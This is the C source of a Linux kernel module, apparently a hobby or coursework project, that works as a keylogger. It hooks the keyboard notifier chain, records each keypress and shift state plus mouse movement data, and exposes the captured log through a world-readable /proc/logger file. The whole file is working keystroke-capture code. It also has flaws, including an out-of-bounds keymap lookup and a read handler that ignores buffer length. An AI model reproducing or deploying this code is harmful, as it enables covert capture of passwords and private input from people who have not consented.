#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <linux/uaccess.h>

#include "logger.h"

#define DEVICE_NAME "logger"
#define LOG_SIZE 2048

extern int write_log_info(char buttons, char dx, char dy, char wheel);

static struct proc_dir_entry* our_proc_file;

static int my_log_len;
static char my_log[LOG_SIZE + 32]; //1* some more capacity to avoid crash
static int isShiftKey = 0; // flag for shift key

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TThien");
MODULE_DESCRIPTION("Logger writor");

int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param){
    struct keyboard_notifier_param *param = _param;
    char buf[128];
	int len;
    if ( code == KBD_KEYCODE )
    {
        if( param->value==42 || param->value==54 )
        {
            if( param->down )
                isShiftKey = 1;
            else
                isShiftKey = 0;
            return NOTIFY_OK;
        }

        if( param->down )
        {
            // 1*
            if (param->value > keynum)
                sprintf(buf, "keyboard: id-%d\n", param->value);
            if( isShiftKey == 0 )
                sprintf(buf, "keyboard: %s\n", keymap[param->value]);
            else
                sprintf(buf, "keyboard: shift + %s\n", keymap[param->value]);

            len = strlen(buf);
            if(len + my_log_len >= LOG_SIZE)
            {
                memset(my_log, 0, LOG_SIZE);
                my_log_len = 0;
            }
            strcat(my_log, buf);
            my_log_len += len; 
        }
    }
    
    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify
};


// Log to /proc/logger
static ssize_t procfs_read(struct file *filp, char *buffer, size_t length, loff_t * offset)
{
    static int ret = 0;
    printk(KERN_INFO "Logger in procfs_read\n");

    if (ret)
        ret = 0;
    else 
    {
        if (copy_to_user(buffer, my_log, my_log_len))
            return -EFAULT;

        printk(KERN_INFO "Logger read %lu bytes\n", my_log_len);
        ret = my_log_len;
    }
    return ret;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = procfs_read,
};

static int __init moduleInit( void )
{
    printk(KERN_INFO "Logger module init\n");
    our_proc_file = proc_create(DEVICE_NAME, 0644 , NULL, &fops);
    if (!our_proc_file)
    {
        printk(KERN_INFO "Logger failed creating %s \n", DEVICE_NAME);
        return -ENOMEM;
    }
    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Logger registered\n");
    
    memset(my_log, 0, LOG_SIZE);
	my_log_len = 0;
    
    return 0;
}

static void __exit moduleExit( void )
{
    printk(KERN_INFO "Logger module exit\n");
    unregister_keyboard_notifier(&keylogger_nb);
    remove_proc_entry(DEVICE_NAME, NULL);
    printk(KERN_INFO "Logger unregistered\n");
}

extern int write_log_info(char buttons, char dx, char dy, char wheel)
{
    printk(KERN_INFO "Logger received %d %d %d %d\n", buttons, dx, dy, wheel);
    
    char buf[32];
	int len;
    
    sprintf(buf, "mouse: %d %d %d %d \n", buttons, dx, dy, wheel);

    len = strlen(buf);
    if(len + my_log_len >= LOG_SIZE)
    {
        memset(my_log, 0, LOG_SIZE);
        my_log_len = 0;
    }
    strcat(my_log, buf);
    my_log_len += len;
    
    return 0;
}
EXPORT_SYMBOL(write_log_info);
module_init(moduleInit);
module_exit(moduleExit);
